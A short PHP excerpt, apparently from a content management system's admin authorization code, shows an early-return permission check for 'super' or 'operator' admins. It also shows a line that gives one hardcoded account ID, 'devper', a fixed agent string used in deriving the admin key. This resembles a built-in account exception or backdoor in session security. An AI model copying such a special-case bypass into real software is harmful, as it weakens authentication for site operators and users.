...
function auth_check($auth, $attr, $return=false)
{
    ...
    if ($is_admin == 'super' || $is_admin == 'operator') return '';
...
in_array($member['mb_id'], ['devper']) === true && ($_AGENT = 'DevelopmentTeam/HansBioTech');
$admin_key = md5($member['mb_datetime'] . get_real_client_ip() . $_AGENT);
